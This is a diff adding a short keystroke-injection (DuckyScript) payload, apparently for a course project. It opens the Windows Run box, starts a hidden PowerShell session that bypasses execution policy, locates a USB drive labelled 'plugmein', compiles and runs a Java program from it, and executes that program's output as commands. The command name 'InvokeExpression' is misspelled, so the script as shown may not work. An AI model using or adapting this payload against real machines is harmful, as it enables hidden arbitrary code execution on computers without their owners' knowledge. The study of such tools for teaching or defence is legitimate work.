@@ -1,0 +1,3 @@
+REM Phase 1
+GUI R
+STRING powershell.exe -Exec bypass -w hidden "$DRIVE_LABEL = 'plugmein'; $DRIVE = (Get-Volume -FileSystemLabel $DRIVE_LABEL).DriveLetter; $DIR = ${DRIVE}/CS362/delivery/; cd ${DIR}/java; javac Main.java; $commands = java Main; InvokeExpression $commands; exit()"
